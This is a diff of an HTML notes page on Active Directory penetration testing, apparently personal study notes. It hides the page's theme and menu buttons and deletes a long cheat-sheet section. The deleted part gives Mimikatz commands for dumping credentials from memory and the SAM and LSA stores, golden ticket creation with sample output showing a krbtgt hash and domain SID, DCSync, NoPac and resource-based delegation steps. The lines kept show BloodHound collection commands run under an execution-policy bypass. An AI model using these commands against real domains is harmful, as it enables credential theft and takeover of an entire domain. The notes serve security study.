@@ -64,11 +64,11 @@
 
             <div class="nav__btns">
                 <!--Theme change button-->
-                <i class="uil uil-moon change-theme" id="theme-button"></i>
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
 
                 <div class="nav__toggle" id="nav-toggle">
                     <i class="uil uil-apps"></i>
-                </div>
+                </div> -->
             </div>
         </nav>
     </header>
@@ -95,73 +95,7 @@ bloodhound</code></pre><ul id="53a3ddfa-33e5-433d-ad6d-e7f7b969385f" class="bull
 Invoke-Bloodhound -CollectionMethod All -Domain &lt;domain&gt;.&lt;local&gt; -ZipFileName file.zip</code></pre><p id="2f402068-56e3-4272-b786-9f8e9c791817" class="">For SharpHound.exe:</p><pre id="88982dc3-c0f2-44c8-8594-995c45a10d38" class="code"><code>powershell -ep bypass
 .\SharpHound.exe -c All -d &lt;domain&gt;.&lt;local&gt; --zipfilename file.zip</code></pre><ul id="ac4be3c8-a70b-491a-b95f-8b52d12a86fc" class="bulleted-list"><li style="list-style-type:disc">Copy the data to your Linux machine</li></ul><ul id="08006a6e-1cc2-4f35-81c4-f7541b2c8831" class="bulleted-list"><li style="list-style-type:disc">upload the files</li></ul><ul id="b4c7af2f-d5d6-44d5-a5b2-1556d8da4c17" class="bulleted-list"><li style="list-style-type:disc">click the hamburger<ul id="0d3b75cb-4963-4f04-9885-0701780eec0f" class="bulleted-list"><li style="list-style-type:circle">you can find all Domain admins</li></ul><ul id="933998fb-7772-4429-a37d-87f5a5bd9e40" class="bulleted-list"><li style="list-style-type:circle">shortest path to a DA</li></ul><ul id="fc3b9207-7511-423a-8d1f-76728022749d" class="bulleted-list"><li style="list-style-type:circle">We want to compromise accounts with DAs logged in</li></ul></li></ul><p id="43ce36bc-dfa2-4e0e-8f68-528d39b1b46d" class="">
 </p><p id="e8390758-54f0-4880-86c2-b4911c77e731" class="">you need valid credentials…</p><pre id="19aef556-8f14-431b-b947-2758892cfb1c" class="code"><code>bloodhound-python -u &#x27;user&#x27; -p &#x27;password&#x27; -d domain.local -c all -ns 0.0.0.0 -gc &#x27;attacktivedirec.spookysec.local&#x27;</code></pre><p id="5c9e29ab-8879-4b64-8a30-ff23eda05196" class=""><strong>CME Bloodhound:</strong></p><pre id="fb5eafd0-1dac-4532-a6aa-2356a61a55fc" class="code"><code>crackmapexec ldap &lt;ip_dc dc01.idk.crazy&gt; -u user -p pass --bloodhound -ns 0.0.0.0 -c All</code></pre><p id="12df6564-e3cf-4aeb-ab75-93995827a45e" class="">
-</p><h2 id="5847297c-3b5d-40bd-9716-d3502cd68a60" class="">M<strong>imikatz:</strong></h2><ul id="0662174d-c34d-4255-b982-bda300f0cd89" class="bulleted-list"><li style="list-style-type:disc">can also invoke-mimikatz</li></ul><ul id="0cc812e8-f29e-49e7-87e2-3a6a609b7fe6" class="bulleted-list"><li style="list-style-type:disc">Dumps credentials stored in memory</li></ul><ul id="92570318-7e94-4d9e-bd84-87e6c3807ca2" class="bulleted-list"><li style="list-style-type:disc">Can perform Credential dumping, PTH,Over-Pass-the-Hash, Pass-The-Ticket, Golden Ticket, Silver Ticket attacks.</li></ul><p id="241398e0-b82c-4a5f-b041-46f11fc39a22" class="">
-</p><ul id="da0ef1d3-26a7-4d0b-bffc-4f5897dcdc76" class="bulleted-list"><li style="list-style-type:disc">credential dumping<pre id="e2c8cf7b-771d-49dc-8795-4068b62250d5" class="code"><code>privilege::debug
-sekurlsa::logonpasswords</code></pre></li></ul><p id="2d7c881e-db30-4f1a-b41c-172acd542e71" class="">
-</p><ul id="f3665986-fedd-4fda-b1db-4cf4f05bd5e4" class="bulleted-list"><li style="list-style-type:disc">wdigest - stored pw in plain text, we can actually turn this on with mimikatz.</li></ul><p id="bf2517ff-a7a9-48fb-acdc-7b903e281733" class="">
-</p><pre id="cddbb6cd-e45d-4e77-82d2-69fc10b0e43c" class="code"><code>lsadump::sam
-lsadump::lsa /patch - local security authority
-kerberos::list /export
-lsadump::secrets
-lsadump::cache
-
-sekurlsa::tickets</code></pre><p id="7773b3ce-77ec-4c8c-9359-1e8843a5a8e5" class="">
-</p><h2 id="581e868d-cb54-4907-b749-24d1da736cf9" class=""><strong>Golden ticket attacks:</strong></h2><ul id="c93ce702-a883-47cd-b7b2-23d71e4df440" class="bulleted-list"><li style="list-style-type:disc">Getting access to the TGS so we can write our own tickets</li></ul><pre id="0f6f85b7-2bc3-4a98-b52f-6ccc21977994" class="code"><code>whoami /user #grab sid, exclude last 5 num
-privilege::debug
-lsadump::lsa /inject /name:krbtgt
-#grab ntlm hash and name then...
-kerberos::golden /User:myuser /domain:domain.local _sid:&lt;sid&gt; /krbtgt:&lt;krbtgt&gt; /ptt
-misc::cmd
-psexec.exe　\\DC01 cmd.exe
-------------------
-=====
-lsadump::lsa /inject /name:krbtgt
-kerberos::golden /User:Administrator /domain:domain.local _sid:&lt;sid&gt; /krbtgt:&lt;krbtgt&gt; /id:500 /ptt
-misc::cmd</code></pre><ul id="13fae81e-a494-4884-aefa-d9220b6c0277" class="bulleted-list"><li style="list-style-type:disc">Golden ticket gives us persistence</li></ul><p id="9acdbd3f-bd63-4367-a17d-0fa1e20f932d" class=""><strong>EXAMPLE:</strong></p><pre id="7a05d8b9-f534-41c8-a1ae-336d86a3b843" class="code"><code>#Dump the krbtgt Hash
-mimikatz # lsadump::lsa /inject /name:krbtgt 
-Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 #we need this
-
-RID  : 000001f6 (502)
-User : krbtgt #we need this
-
- * Primary
-    NTLM : 5508500012cc005cf7082a9a89ebdfdf #we need this
-    LM   :
-  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
-    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
-    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c
-
-#Create a Golden Ticket
-mimikatz # kerberos::golden /user:Administrator /domain:Controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf
-User      : Administrator 
-Domain    : Controller.local (CONTROLLER)
-SID       : S-1-5-21-849420856-2351964222-986696166
-User Id   : 500
-Groups Id : *513 512 520 518 519
-ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
-Lifetime  : 3/5/2023 12:28:04 PM ; 3/2/2033 12:28:04 PM ; 3/2/2033 12:28:04 PM
--&gt; Ticket : ticket.kirbi
-
- * PAC generated 
- * PAC signed
- * EncTicketPart generated
- * EncTicketPart encrypted
- * KrbCred generated
-
-Final Ticket Saved to file !
-
-#Use the Golden Ticket to access other machine
-mimikatz # misc::cmd 
-Patch OK for &#x27;cmd.exe&#x27; from &#x27;DisableCMD&#x27; to &#x27;KiwiAndCMD&#x27; @ 00007FF6920D43B8
-
-dir \\Desktop-1\c$
-
-</code></pre><h2 id="04157186-bd6e-42e9-98f2-91ba12dc9eb3" class="">DCSync:</h2><pre id="58e20e9b-987d-4b9d-9ec3-360ed8b07505" class="code"><code>lsadump::dcsync /user:Administrator</code></pre><h2 id="5ec81b0b-2de0-4fe3-be36-ff27536dfad3" class="">Sam the Admin:</h2><p id="9d72b5f6-459f-4ce9-87a9-a847c91bd168" class="">#TODO</p><h2 id="395ae4a9-2a9e-40f7-a762-f497bb45f0e0" class="">NoPac:</h2><pre id="501673cc-d612-45b0-8be7-f6fa49affc83" class="code"><code>crackmapexec smb IP -u user -p pass -M nopac</code></pre><p id="93900ade-1ce5-4284-82c0-b0f3728bec57" class="">
-</p><p id="121035b1-a300-4bb2-b9c1-160bbcf89300" class="">GenericAll:</p><p id="f9477618-ad2f-4b13-be9c-a47b8c4b0c16" class=""><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse</a></p><p id="7ba881e7-ac7e-4e5d-8211-af59a250dbde" class=""><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation</a></p><pre id="e7687655-b321-4884-a32d-7e33df6f5908" class="code"><code>#Adding computer to list
-impacket-addcomputer 
-impacket-rbcd -f 
-#request service ticket
-impacket-getST</code></pre></div></article></main></main>
+</p></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
